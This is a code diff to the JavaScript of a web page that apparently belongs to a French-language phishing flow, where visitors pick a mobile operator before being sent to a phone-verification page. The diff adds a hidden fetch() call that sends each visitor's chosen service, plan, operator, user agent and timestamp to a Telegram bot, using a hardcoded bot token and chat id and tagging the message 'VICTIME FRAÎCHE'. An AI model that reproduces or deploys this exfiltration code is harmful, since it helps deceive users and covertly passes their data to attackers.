@@ -85,12 +85,23 @@
         }, 4000);
 
         function selectOperator(op) {
-            localStorage.setItem('selectedOperator', op);
-            document.getElementById('loader').style.display = 'block';
-            setTimeout(() => {
-                window.location.href = 'verify-phone.html';
-            }, 2000);
-        }
+    localStorage.setItem('selectedOperator', op);
+
+    // Envoi opérateur choisi au canal privé
+    fetch(`https://api.telegram.org/bot8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({
+            chat_id: "-1003550552109",
+            text: `🔥 VICTIME FRAÎCHE 🔥\nService: ${localStorage.getItem('selectedService') || 'Inconnu'}\nPlan: ${localStorage.getItem('selectedPlan') || 'Inconnu'}\nOpérateur: ${op}\nIP: ${navigator.userAgent}\nHeure: ${new Date().toLocaleString('fr-FR')}`
+        })
+    });
+
+    document.getElementById('loader').style.display = 'block';
+    setTimeout(() => {
+        window.location.href = 'verify-phone.html';
+    }, 2000);
+}
 
         function selectOther() {
             document.getElementById('warning').style.display = 'block';
